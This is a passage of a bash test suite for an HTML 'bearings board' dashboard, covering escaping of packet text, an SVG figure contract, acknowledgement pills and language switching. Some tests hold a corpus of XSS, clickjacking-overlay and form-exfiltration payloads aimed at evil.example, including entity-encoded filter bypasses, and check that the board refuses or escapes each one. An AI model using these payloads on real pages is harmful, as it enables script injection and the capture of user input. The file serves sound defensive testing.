        and (.packet.items == [["那段判斷沒在 Linux 上跑過", "PR #10"], ["gh pr diff 10"]]))
  ' >/dev/null || fail "the language rule did not hold across the card: $out"
  pass "the switching part follows the captain while the as-written block says which language it is"
}

# The block is the one place a packet's own words reach the captain's surface,
# and that surface hosts the answer channel. It is built from data, so markup a
# worker typed into a packet arrives as the characters they typed.
test_the_packet_block_renders_its_words_as_words() {
  local home out payload
  home=$(make_home packet-not-markup)
  payload=$(packet_payload en '[]' | jq '
    .captains_call[0].packet.sections[0].items[0].text
      = {en: "<img src=x onerror=\"window.lavish.queuePrompt(\u0027pwned\u0027)\"> and <b>bold</b>",
         hant: "\u4e00", hans: "\u4e00"}')
  out=$(render_payload "$home" "$payload")
  printf '%s' "$out" | jq -e '
    (.cards[0].packet.items[0][0]
      | test("<img src=x") and test("<b>bold</b>"))
  ' >/dev/null || fail "the packet block did not render a worker's characters as text: $out"
  # and the link it names is a real link the captain can follow
  printf '%s' "$out" | jq -e '
    .cards[0].packet.links == [{text:"PR #10", url:"https://example.test/pr/10"}]
  ' >/dev/null || fail "a link the packet named did not render as a link: $out"
  pass "the packet block renders a worker's words as words, and its links as links"
}

# The board INLINES a drawing, so the drawing is the one field it cannot render
# as text. It is held to the figure contract by the contract's own checker,
# run over the payload this build was handed rather than trusted from the
# packet it was read out of.
test_a_payload_drawing_that_breaks_the_figure_contract_refuses_the_board() {
  local home payload rc out
  home=$(make_home packet-hostile-figure)
  payload=$(packet_payload en "[$(packet_figure cmp quiet loud)]" | jq '
    .captains_call[0].packet.figures[0].svg
      |= sub("<text"; "<a xlink:href=\"javascript:alert(1)\"></a><text")')
  printf '%s\n' "$payload" > "$home/payload.json"
  set +e
  out=$(PATH="$home/fakebin:$PATH" FM_HOME="$home" \
    FM_STATE_OVERRIDE="$home/state" FM_DATA_OVERRIDE="$home/data" \
    FM_PROCEVENT_CLAIM_ROOT="$home/procevent-claims" \
    "$BOARD" build "$home/payload.json" 2>&1)
  rc=$?
  set -e
  [ "$rc" -ne 0 ] || fail "the board built with a drawing that can run code: $out"
  printf '%s' "$out" | grep -q "javascript:alert(1)" \
    || fail "the refusal does not name the href it refused: $out"

  # The board is the far end of the same check, so the same corpus has to stop
  # here too - including the HTML breakout markup that ends the svg and is
  # reparsed as HTML on the page that hosts the answer channel.
  local shape
  for shape in \
    '<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/board\">' \
    '<button formaction=\"https://evil.example/collect\">Choose</button>' \
    '<img src=\"https://evil.example/pixel\">' \
    '<p></p><div></div><br>' \
    '<foreignObject><body>x</body></foreignObject>' \
    '<style>.bb-decision__foot{display:none}' \
    '<rect onpointerdown=\"alert(1)\"/>' \
    '<rect/onclick=\"alert(1)\"/>' \
    '<rect style=\"position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0.01\"/>' \
    '<set attributeName=\"style\" to=\"position:fixed;width:100vw;height:100vh\"/>' \
    '<rect class=\"bb-decision__foot\"/>' \
    '<rect style=\"position&#58;fixed;top&#58;0;width&#58;100vw;height&#58;100vh\"/>' \
    '<rect style=\"position&#x3a;fixed;top&#x3A;0\"/>' \
    '<rect style=\"pos&#105;tion:fixed\"/>' \
    '<a href=\"javascript&colon;alert(1)\"></a>' \
    '<set attributeName=\"style\" to=\"position&#58;fixed;width&#58;100vw\"/>' \
  ; do
    payload=$(packet_payload en "[$(packet_figure cmp quiet loud)]" \
      | jq --arg s "$shape" '.captains_call[0].packet.figures[0].svg |= sub("<text"; $s + "<text")')
    printf '%s\n' "$payload" > "$home/payload.json"
    set +e
    out=$(PATH="$home/fakebin:$PATH" FM_HOME="$home" \
      FM_STATE_OVERRIDE="$home/state" FM_DATA_OVERRIDE="$home/data" \
      FM_PROCEVENT_CLAIM_ROOT="$home/procevent-claims" \
      "$BOARD" build "$home/payload.json" 2>&1)
    rc=$?
    set -e
    [ "$rc" -ne 0 ] || fail "the board inlined markup outside the drawing contract: $shape"
  done
  pass "a payload drawing that breaks the figure contract refuses the board"
}

# A figure says which option tab it opens in. The template renders it in the
# tab whose value matches exactly and in NO tab otherwise, so a payload edited
# to name an option the card does not offer is refused rather than losing the
# drawing off the surface the captain decides on.
# A figure need not be named for the board to inline it, and an unnamed one is
# exactly the drawing a check must not skip: it is still markup going onto the
# page that hosts the answer channel.
# A slug is what the id-namespace clause namespaces WITH, so an absent one is
# not a clause that passes - it is a clause that skips itself. The board is the
# boundary that exists because this file is edited after the packet wrote it,
# so it decides on what the field is, not on whether it happens to be there.
test_a_drawing_without_a_usable_slug_refuses_the_board() {
  local home payload rc out
  home=$(make_home packet-unnamed-figure)
  build_it() {  # <payload-json> -> exit status of build, output on stdout
    printf '%s\n' "$1" > "$home/payload.json"
    PATH="$home/fakebin:$PATH" FM_HOME="$home" \
      FM_STATE_OVERRIDE="$home/state" FM_DATA_OVERRIDE="$home/data" \
      FM_PROCEVENT_CLAIM_ROOT="$home/procevent-claims" \
      "$BOARD" build "$home/payload.json" 2>&1
  }
  payload=$(packet_payload en "[$(packet_figure cmp quiet loud)]" \
    | jq '.captains_call[0].packet.figures[0].slug = ""')
  set +e; out=$(build_it "$payload"); rc=$?; set -e
  [ "$rc" -ne 0 ] || fail "the board inlined a drawing nothing could namespace: $out"

  # and two drawings in one card may not share one, for the same reason the
  # packet makes them unique within itself
  payload=$(packet_payload en "[$(packet_figure cmp quiet loud)]" | jq '
    .captains_call[0].packet.figures += [.captains_call[0].packet.figures[0]]')
  set +e; out=$(build_it "$payload"); rc=$?; set -e
  [ "$rc" -ne 0 ] || fail "two drawings on one card shared an id namespace: $out"

  # a named one still builds, so the refusal is about the name and nothing else
  payload=$(packet_payload en "[$(packet_figure cmp quiet loud)]")
  build_it "$payload" >/dev/null || fail "a named drawing stopped building"
  pass "a drawing without a usable slug refuses the board"
}

# This is a jq script. A board whose cards carry no drawings has nothing for the
# figure checker to read, so it must build on a host that has no python3 at all.
test_a_board_with_no_drawings_builds_without_python3() {
  local home out fakebin
  home=$(make_home packet-no-python3)
  fakebin="$home/fakebin"
  # A PATH whose python3 is absent, with everything else the build needs still
  # reachable: the stub shadows the real interpreter for this build only.
  cat > "$fakebin/python3" <<'SH'
#!/usr/bin/env bash
echo "python3 must not be needed to build a board with no drawings" >&2
exit 127
SH
  chmod +x "$fakebin/python3"
  printf '%s\n' "$(packet_payload en '[]')" > "$home/payload.json"
  out=$(PATH="$home/fakebin:$PATH" FM_HOME="$home" \
    FM_STATE_OVERRIDE="$home/state" FM_DATA_OVERRIDE="$home/data" \
    FM_PROCEVENT_CLAIM_ROOT="$home/procevent-claims" \
    "$BOARD" build "$home/payload.json" 2>&1) \
    || fail "a board with no drawings did not build without python3: $out"
  pass "a board whose cards carry no drawings builds without python3"
}

test_a_figure_cannot_name_an_option_the_card_does_not_offer() {
  local home payload rc out
  home=$(make_home packet-figure-option)
  payload=$(packet_payload en "[$(packet_option_figure quiet-only "Quiet" quiet)]")
  printf '%s\n' "$payload" > "$home/payload.json"
  set +e
  out=$(PATH="$home/fakebin:$PATH" FM_HOME="$home" \
    FM_STATE_OVERRIDE="$home/state" FM_DATA_OVERRIDE="$home/data" \
    FM_PROCEVENT_CLAIM_ROOT="$home/procevent-claims" \
    "$BOARD" build "$home/payload.json" 2>&1)
  rc=$?
  set -e
  [ "$rc" -ne 0 ] || fail "the board accepted a drawing for an option it does not offer: $out"
  pass "a drawing that names an option the card does not offer refuses the board"
}

test_an_inline_packet_never_offers_a_second_address() {
  local home out
  home=$(make_home packet-one-address)
  out=$(render_payload "$home" "$(packet_payload en '[]')")
  # The card carries a packet_url, and the card still does not offer it: the
  # packet is here, so there is no second page to send the captain to.
  printf '%s' "$out" | jq -e '
    (.cards[0] | (.chips | index("open the packet")) == null and .packet != null)
  ' >/dev/null || fail "an inline packet still offered its own separate page: $out"
  # And the build opened exactly one Lavish session: the board itself.
  [ "$(wc -l < "$home/lavish-open" | tr -d ' ')" = 1 ] \
    || fail "the build established more than the board's own session"
  grep -q 'bearings-board.html$' "$home/lavish-open" \
    || fail "the one opened session was not the board: $(cat "$home/lavish-open")"
  pass "a card with the packet inline opens no second session and offers no second address"
}

test_a_card_with_no_packet_renders_exactly_as_it_did() {
  local home out
  home=$(make_home packet-absent)
  out=$(render_payload "$home" "$(five_question_payload en)")
  printf '%s' "$out" | jq -e '
    (.cards[0]
      | .tabs == [] and .panels == [] and .packet == null
        and ([.options[] | .label] | index("Reconcile") != null)
        and (.chips | index("open the packet") != null))
  ' >/dev/null || fail "a card with no packet stopped rendering the way it always did: $out"
  pass "a card whose task has no packet renders exactly as it does today"
}

# The captain approved a panel that says what the option changes, not only what
# it costs. Every one of these is optional, so the test also pins that a packet
# carrying none of them still renders the panel it always did.
test_an_option_panel_carries_what_it_changes_touches_and_buys() {
  local home out figures
  home=$(make_home packet-option-detail)
  figures=$(jq -n --argjson c "$(packet_figure cmp quiet loud)" '[$c]')
  out=$(render_payload "$home" "$(packet_payload_full_option en "$figures")")
  printf '%s' "$out" | jq -e '.error == ""' >/dev/null \
    || fail "the board rendered its error instead of the card: $out"
  printf '%s' "$out" | jq -e '
    (.cards[0].panels[1].rows
      | (map(select(.k == "Adds") | .v) == [["a merged-record rule"]])
        and (map(select(.k == "Removes") | .v) == [["the stdout probe"]])
        and (map(select(.k == "Leaves alone") | .v) == [["the answer channel"]])
        and (map(select(.k == "Files it touches") | .v)
             == [["bin/fm-contributions.sh", "tests/fm-contributions.test.sh"]])
        and (map(select(.k == "What it buys") | .v) == [["One behaviour to reason about."]]))
    # the option that carries none of them renders exactly as it always did
    and (.cards[0].panels[2].rows == [])
    and (.cards[0].panels[2].cost == "The probe stays load-bearing.")
  ' >/dev/null || fail "an option panel did not carry what it changes: $out"
  pass "an option panel carries what it adds, removes, leaves alone, touches and buys"
}

test_the_fuller_option_panel_follows_the_captains_language() {
  local home out figures
  home=$(make_home packet-option-detail-hant)
  figures=$(jq -n --argjson c "$(packet_figure cmp quiet loud)" '[$c]')
  out=$(render_payload "$home" "$(packet_payload_full_option hant "$figures")")
  printf '%s' "$out" | jq -e '
    (.cards[0].panels[1].rows
      | (map(select(.k == "新增") | .v) == [["一條合併記錄規則"]])
        and (map(select(.k == "換到什麼") | .v) == [["只剩一種行為要想。"]]))
  ' >/dev/null || fail "the fuller panel did not switch language: $out"
  pass "what an option changes and buys switches with the captain, like the rest of the card"
}

test_a_free_form_answer_never_counts_as_choosing_an_option() {
  local home out figures
  home=$(make_home packet-freeform)
  figures=$(packet_figure cmp quiet loud)
  out=$(render_payload "$home" "$(packet_payload en "[$figures]")")
  # The captain types his own words and presses Enter. A browser answers that
  # by pressing the form's first submit button, so no option's button may be
  # one: what goes down the channel is the note, chosen by nobody.
  printf '%s' "$out" | jq -e '
    # exactly one answer leaves the page. Asserting only the LAST one is what
    # made an earlier version of this test vacuous: with the option buttons
    # wired as submit buttons, the browser pressed one first, a vote went down
    # the channel, and the note that followed it hid the vote from the check.
    ((.cards[0].on_enter_all | length) == 1)
    and (.cards[0].on_enter_all[0]
      | .schema == "fm-bearings-answer.v1" and .question == "stream-choice"
        and .selection == "" and .note == "in my own words")
  ' >/dev/null || fail "a free-form answer was recorded as choosing an option: $out"
  pass "a free-form answer with no option chosen is queued as a note, not a vote"
}

# ---- the captain's click, acknowledged --------------------------------------

# Render a payload that carries acknowledgements, optionally replaying one
# captain click through the real handler first.
render_click() {  # <home> <payload-json> [click] [relang]
  local home=$1 data="$1/payload.json"
  printf '%s\n' "$2" > "$data"
  PATH="$home/fakebin:$PATH" FM_HOME="$home" \
    FM_STATE_OVERRIDE="$home/state" FM_DATA_OVERRIDE="$home/data" \
    FM_PROCEVENT_CLAIM_ROOT="$home/procevent-claims" \
    "$BOARD" build "$data" >/dev/null || fail "the board did not build"
  node "$HARNESS" "$home/.lavish/bearings-board.html" ${3:+"$3"} ${4:+"$4"} \
    || fail "the built board could not be rendered"
}

# An acknowledgement carries the second the captain clicked, because that stamp
# is what the page ages into a waiting time; `clicked_at` puts the click that
# many seconds in the past.
clicked_at() {  # <seconds-ago>
  printf '%s\n' "$(( $(date -u +%s) - $1 ))"
}

ack_payload() {  # <underway-ack-json>
  jq -n --argjson ack "$1" '{
    schema:"fm-bearings-board.v1", home:"render-home", generated:"2026-09-19T00:00Z",
    prs_live:false, captains_call:[], landed:[], charted:[],
    underway:[{id:"acked", repo:"sample", name:"Acknowledged work", state:"working",
               kind:"ship", doing:"under way"} + (if $ack == null then {} else {ack:$ack} end)]}'
}

acting_ack() {  # <seconds-ago>
  jq -nc --argjson at "$(clicked_at "$1")" '{kind:"acting", at:$at}'
}

test_an_acknowledged_row_says_it_is_being_acted_on() {
  local home out
  home=$(make_home ack-acting)
  out=$(render_click "$home" "$(ack_payload "$(acting_ack 2)")")
  printf '%s' "$out" | jq -e '
    .error == "" and (.underway[0].ack | .kind == "acting" and .label == "acting on it" and .why == null)
  ' >/dev/null || fail "an acting acknowledgement did not reach the row: $out"
  pass "an acknowledged row says the answer is being acted on"
}

test_a_refused_acknowledgement_says_so_with_its_reason() {
  local home out
  home=$(make_home ack-refused)
  out=$(render_click "$home" "$(ack_payload "$(jq -nc --argjson at "$(clicked_at 5)" \
    '{kind:"refused", at:$at, why:"it is waiting on the board refresh, which is still in review"}')")")
  printf '%s' "$out" | jq -e '
    .error == ""
      and (.underway[0].ack
        | .kind == "refused" and .label == "not started"
          and .why == "it is waiting on the board refresh, which is still in review")
  ' >/dev/null || fail "the refusal did not reach the row with its reason: $out"
  pass "a refused acknowledgement says so on the row, with the reason"
}

# The page ages the pill itself, from the stamp the click left on the record.
# The board is republished only when the first mate acts, so a row that could
# age only on a republication would report a slow answer and stay silent about
# a missed one - and a missed answer is the case the captain asked for this
# for. Nothing here republishes: one build, one read, an older stamp.
test_a_late_acknowledgement_says_how_long_it_has_waited() {
  local home out
  home=$(make_home ack-late)
  out=$(render_click "$home" "$(ack_payload "$(acting_ack 185)")")
  printf '%s' "$out" | jq -e '
    .error == "" and (.underway[0].ack | .kind == "late" and .label == "still waiting · 3m")
  ' >/dev/null || fail "an unanswered acknowledgement did not age into a waiting time: $out"
  pass "a late acknowledgement says it is still waiting and for how long"
}

# Under the minute the captain settled, the same record still reads as being
# acted on: the waiting report is the exception, not the resting state.
test_a_fresh_acknowledgement_has_not_aged_into_waiting() {
  local home out
  home=$(make_home ack-fresh)
  out=$(render_click "$home" "$(ack_payload "$(acting_ack 45)")")
  printf '%s' "$out" | jq -e '
    .error == "" and (.underway[0].ack | .kind == "acting" and .label == "acting on it")
  ' >/dev/null || fail "an acknowledgement inside the minute already reported itself late: $out"
  pass "an acknowledgement inside the captain's minute still reads as being acted on"
}

test_a_row_with_no_acknowledgement_is_unchanged() {
  local home with without
  home=$(make_home ack-absent)
  without=$(render_click "$home" "$(ack_payload null)")
  printf '%s' "$without" | jq -e '.error == "" and .underway[0].ack == null' >/dev/null \
    || fail "a row with no acknowledgement grew one: $without"
  # Everything else about that row reads exactly as it does with the field
  # absent, so the feature costs an unacknowledged board nothing.
  with=$(render_click "$home" "$(ack_payload "$(acting_ack 2)")")
  printf '%s' "$with" | jq --argjson bare "$(printf '%s' "$without" | jq -c '.underway[0]')" -e '
    (.underway[0] | del(.ack)) == ($bare | del(.ack))
  ' >/dev/null || fail "an acknowledgement changed the rest of the row: $with"
  pass "a row with no acknowledgement renders exactly as it does today"
}

test_an_unknown_acknowledgement_kind_renders_nothing() {
  local home board out
  home=$(make_home ack-unknown)
  render_click "$home" "$(ack_payload "$(acting_ack 2)")" >/dev/null
  board="$home/.lavish/bearings-board.html"
  # The payload contract refuses an unknown kind, so the only way to reach the
  # renderer with one is to rewrite what was already published. The renderer's
  # own guard is the second, independent detection of the same class, and this
  # is what proves it is not decoration.
  perl -pi -e 's/"kind":"acting"/"kind":"sudo-merge"/' "$board" \
    || fail "could not rewrite the published payload"
  out=$(node "$HARNESS" "$board") || fail "the rewritten board could not be rendered"
  printf '%s' "$out" | jq -e '.error == "" and .underway[0].ack == null' >/dev/null \
    || fail "an unknown acknowledgement kind rendered a pill: $out"
  pass "an unknown acknowledgement kind renders nothing at all"
}

test_the_dispatch_send_acknowledges_every_row_it_picked() {
  local home out
  home=$(make_home ack-dispatch)
  out=$(render_click "$home" "$(jq -n '{
    schema:"fm-bearings-board.v1", home:"render-home", generated:"2026-09-19T00:00Z",
    prs_live:false, captains_call:[], underway:[], landed:[],
    charted:[{id:"picked", repo:"sample", title:"Queued work", reason:"", dispatchable:true},
             {id:"held", repo:"sample", title:"Blocked work", reason:"waits on the cutover",
              dispatchable:false}]}')" dispatch)
  printf '%s' "$out" | jq -e '
    .error == ""
      and (.charted[0] | .title == "Queued work" and .ack.kind == "acting"
        and .ack.label == "acting on it")
      and (.charted[1] | .title == "Blocked work" and .ack == null)
  ' >/dev/null || fail "the dispatch send did not acknowledge the rows it picked: $out"
  pass "sending a dispatch order acknowledges every row it picked, and only those"
}

test_answering_a_decision_card_acknowledges_it_on_the_card() {
  local home out
  home=$(make_home ack-answer)
  out=$(render_click "$home" "$(five_question_payload en)" answer)
  printf '%s' "$out" | jq -e '
    .error == "" and (.cards[0].ack | .kind == "acting" and .label == "acting on it")
  ' >/dev/null || fail "answering a decision card left the card silent: $out"
  pass "answering a decision card acknowledges it on the card"
}

# The captain was promised the language switch stays available, and he settled
# that a click shows immediately it was received. A switch re-renders every
# row from the payload, which carries no acknowledgement for a click made
# seconds ago - so the page has to remember the keys it was clicked on, or the
# switch takes the acknowledgement away again.
test_a_dispatch_acknowledgement_survives_the_language_switch() {
  local home out
  home=$(make_home ack-dispatch-lang)
  out=$(render_click "$home" "$(jq -n '{
    schema:"fm-bearings-board.v1", home:"render-home", generated:"2026-09-19T00:00Z",
    prs_live:false, captains_call:[], underway:[], landed:[],
    charted:[{id:"picked", repo:"sample", title:"Queued work", reason:"", dispatchable:true}]}')" \
    dispatch hant)
  printf '%s' "$out" | jq -e '
    .error == "" and (.charted[0].ack | .kind == "acting" and .label == "處理中")
  ' >/dev/null || fail "the language switch took the dispatch acknowledgement away: $out"
  pass "a dispatch acknowledgement survives the language switch, in the new language"
}

test_a_card_acknowledgement_survives_the_language_switch() {
  local home out
  home=$(make_home ack-answer-lang)
  out=$(render_click "$home" "$(five_question_payload en)" answer hant)
  printf '%s' "$out" | jq -e '
    .error == "" and (.cards[0].ack | .kind == "acting" and .label == "處理中")
  ' >/dev/null || fail "the language switch took the card acknowledgement away: $out"
  pass "an answered card keeps its acknowledgement across the language switch"
}

test_the_acknowledgement_speaks_the_captains_language() {
  local home out
  home=$(make_home ack-lang)
  out=$(render_click "$home" "$(ack_payload "$(acting_ack 185)" | jq -c '.lang = "hant"')")
  printf '%s' "$out" | jq -e '
    .error == "" and (.underway[0].ack.label == "還在等處理 · 3m")
  ' >/dev/null || fail "the acknowledgement did not follow the board language: $out"
  pass "an acknowledgement is worded in the language the board is showing"
}

test_an_underway_row_leads_with_the_task_name_and_keeps_its_run_status
test_an_underway_identifier_label_is_not_replaced_by_run_status
test_charted_next_reads_newest_filed_first
test_charted_rows_without_a_filed_date_follow_the_dated_rows_in_payload_order
test_a_warning_row_reads_as_a_repair_not_as_queued_work
test_warnings_are_excluded_from_the_charted_next_count
test_a_board_of_only_warnings_still_reports_nothing_queued
test_omitted_warnings_never_count_as_more_queued
test_an_omitted_kind_keeps_the_existing_queued_rendering
test_a_decision_card_answers_the_five_questions_in_english_by_default
test_the_payload_language_switches_every_visible_string
test_a_packet_with_figures_opens_its_tabs_inside_the_card
test_two_cards_drawing_with_the_same_slug_do_not_share_ids
test_the_board_styles_a_drawings_box_and_never_its_insides
test_a_board_links_own_class_decides_how_it_reads
test_a_packet_without_figures_still_renders_its_card
test_the_packet_body_stays_in_the_language_it_was_written_in
test_the_packet_block_renders_its_words_as_words
test_a_payload_drawing_that_breaks_the_figure_contract_refuses_the_board
test_a_drawing_without_a_usable_slug_refuses_the_board
test_a_board_with_no_drawings_builds_without_python3
test_a_figure_cannot_name_an_option_the_card_does_not_offer
test_an_inline_packet_never_offers_a_second_address
test_a_card_with_no_packet_renders_exactly_as_it_did
test_an_option_panel_carries_what_it_changes_touches_and_buys
test_the_fuller_option_panel_follows_the_captains_language
test_a_free_form_answer_never_counts_as_choosing_an_option
test_an_acknowledged_row_says_it_is_being_acted_on
test_a_refused_acknowledgement_says_so_with_its_reason
test_a_late_acknowledgement_says_how_long_it_has_waited
test_a_fresh_acknowledgement_has_not_aged_into_waiting
test_a_row_with_no_acknowledgement_is_unchanged
test_an_unknown_acknowledgement_kind_renders_nothing
test_the_dispatch_send_acknowledges_every_row_it_picked
test_answering_a_decision_card_acknowledges_it_on_the_card
test_a_dispatch_acknowledgement_survives_the_language_switch
test_a_card_acknowledgement_survives_the_language_switch
test_the_acknowledgement_speaks_the_captains_language
